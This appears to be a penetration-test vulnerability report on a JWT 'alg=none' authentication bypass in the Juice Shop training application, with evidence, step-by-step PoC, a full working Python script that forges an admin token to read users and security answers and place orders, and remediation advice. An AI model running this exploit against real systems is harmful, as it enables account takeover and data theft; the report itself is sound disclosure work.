╭─ VULN-0007 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: JWT “alg=none” Acceptance Allows Authentication Bypass and           │
│  Privilege Escalation                                                        │
│                                                                              │
│  Severity: CRITICAL                                                          │
│                                                                              │
│  CVSS Score: 9.4                                                             │
│                                                                              │
│  Target: http://juiceshop:3000                                               │
│                                                                              │
│  Endpoint: /api/Users, /api/SecurityAnswers, /b2b/v2/orders                  │
│                                                                              │
│  Method: GET, POST                                                           │
│                                                                              │
│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L                            │
│                                                                              │
│  Description                                                                 │
│  A critical authentication vulnerability was identified in the JWT           │
│  validation logic. The application accepts attacker-crafted JSON Web Tokens  │
│  with the header algorithm set to \"none\" (i.e., unsigned tokens with an    │
│  empty signature) and treats them as authenticated.                          │
│                                                                              │
│  Because the token payload includes user identity and authorization claims   │
│  (e.g., id, email, role), an attacker can forge tokens for arbitrary users   │
│  and roles. This enables full authentication bypass and privilege            │
│  escalation across multiple protected APIs, including the B2B API.           │
│                                                                              │
│  Impact                                                                      │
│  An unauthenticated attacker can forge arbitrary JWTs and gain access to     │
│  protected resources and actions, including:                                 │
│  - Reading sensitive user account data (e.g., enumerating users via          │
│  /api/Users)                                                                 │
│  - Accessing security-answer records (useful for account recovery attacks)   │
│  via /api/SecurityAnswers                                                    │
│  - Performing authenticated business actions in the B2B API (e.g., creating  │
│  orders via /b2b/v2/orders)                                                  │
│                                                                              │
│  This is a full compromise of the application’s authentication and           │
│  authorization boundary, enabling broad confidentiality and integrity        │
│  impact.                                                                     │
│                                                                              │
│  Technical Analysis                                                          │
│  The server accepts JWTs where the JOSE header specifies \"alg\":\"none\"    │
│  and the token string ends with a trailing dot, indicating no signature was  │
│  provided: base64url(header).base64url(payload).                             │
│                                                                              │
│  The application then appears to trust identity/authorization data inside    │
│  the token payload (e.g., data.id, data.email, data.role) without            │
│  cryptographic verification. As a result, an attacker can mint tokens with   │
│  arbitrary claims and access endpoints that otherwise enforce bearer         │
│  authentication.                                                             │
│                                                                              │
│  Evidence references (captured traffic):                                     │
│  - 3024: GET /api/Users without Authorization returned 401 (no               │
│  Authorization header)                                                       │
│  - 3074 / 3081: GET /api/Users with forged \"alg=none\" token returned 200   │
│  and a full user list                                                        │
│  - 3093: GET /api/SecurityAnswers with forged token returned 200 and         │
│  exposed SecurityAnswer records                                              │
│  - 3097: POST /b2b/v2/orders with forged token returned 200 with an order    │
│  confirmation                                                                │
│                                                                              │
│  PoC Description                                                             │
│  1. Send an unauthenticated request to GET http://juiceshop:3000/api/Users   │
│  and confirm a 401 response.                                                 │
│  2. Generate an unsigned JWT with header {\"typ\":\"JWT\",\"alg\":\"none\"}  │
│  and a payload containing attacker-chosen identity claims, then ensure the   │
│  token ends with a trailing dot (no signature).                              │
│  3. Replay GET http://juiceshop:3000/api/Users with header Authorization:    │
│  Bearer <forged_token> and observe a 200 response.                           │
│  4. Replay GET http://juiceshop:3000/api/SecurityAnswers with the same       │
│  forged token and observe a 200 response.                                    │
│  5. Replay POST http://juiceshop:3000/b2b/v2/orders with the same forged     │
│  token and observe a 200 order confirmation response.                        │
│                                                                              │
│  PoC Code                                                                    │
│  import base64                                                               │
│  import json                                                                 │
│  import time                                                                 │
│                                                                              │
│  import requests                                                             │
│                                                                              │
│                                                                              │
│  BASE = "http://juiceshop:3000"                                              │
│                                                                              │
│                                                                              │
│  def b64url(data: bytes) -> str:                                             │
│      return base64.urlsafe_b64encode(data).decode().rstrip("=")              │
│                                                                              │
│                                                                              │
│  def jwt_alg_none(payload: dict) -> str:                                     │
│      header = {"typ": "JWT", "alg": "none"}                                  │
│      return f"{b64url(json.dumps(header, separators=(',',                    │
│  ':')).encode())}.{b64url(json.dumps(payload, separators=(',',               │
│  ':')).encode())}."                                                          │
│                                                                              │
│                                                                              │
│  def main() -> int:                                                          │
│      # Baseline: unauthenticated should be rejected                          │
│      r0 = requests.get(f"{BASE}/api/Users", timeout=10)                      │
│      print("Unauth /api/Users status:", r0.status_code)                      │
│                                                                              │
│      # Forge an unsigned token (role can be set arbitrarily)                 │
│      payload = {                                                             │
│          "status": "success",                                                │
│          "data": {                                                           │
│              "id": 1,                                                        │
│              "email": "admin@juice-sh.op",                                   │
│              "role": "admin"                                                 │
│          },                                                                  │
│          "iat": int(time.time())                                             │
│      }                                                                       │
│      forged = jwt_alg_none(payload)                                          │
│      headers = {"Authorization": f"Bearer {forged}"}                         │
│                                                                              │
│      r1 = requests.get(f"{BASE}/api/Users", headers=headers, timeout=10)     │
│      print("Forged alg=none /api/Users status:", r1.status_code)             │
│      print("Body snippet:", r1.text[:200])                                   │
│                                                                              │
│      r2 = requests.get(f"{BASE}/api/SecurityAnswers", headers=headers,       │
│  timeout=10)                                                                 │
│      print("Forged alg=none /api/SecurityAnswers status:", r2.status_code)   │
│      print("Body snippet:", r2.text[:200])                                   │
│                                                                              │
│      order = {"cid": "JWTNONE", "orderLines": [{"productId": 8, "quantity":  │
│  1, "customerReference": "PO0000001"}]}                                      │
│      r3 = requests.post(f"{BASE}/b2b/v2/orders", headers={**headers,         │
│  "Content-Type": "application/json"}, json=order, timeout=10)                │
│      print("Forged alg=none /b2b/v2/orders status:", r3.status_code)         │
│      print("Body:", r3.text)                                                 │
│                                                                              │
│      return 0                                                                │
│                                                                              │
│                                                                              │
│  if __name__ == "__main__":                                                  │
│      raise SystemExit(main())                                                │
│                                                                              │
│  Remediation                                                                 │
│  Enforce strict JWT verification and harden claim validation:                │
│  - Explicitly disallow \"alg\":\"none\" and any algorithm not required by    │
│  design; pin verification to a single allowed algorithm (e.g., RS256) and    │
│  reject tokens whose header algorithm does not match.                        │
│  - Ensure signature verification is always performed and cannot be bypassed  │
│  via header manipulation.                                                    │
│  - Validate standard claims (exp, nbf, iss, aud) and enforce appropriate     │
│  token lifetimes.                                                            │
│  - Do not rely on client-controlled token claims for authorization           │
│  decisions unless the token is verifiably signed by a trusted issuer and     │
│  intended for the specific audience/service.                                 │
│  - Add automated security tests to verify that unsigned/incorrectly signed   │
│  tokens are rejected across all protected endpoints (including /b2b/v2).     │
│                                                                              │
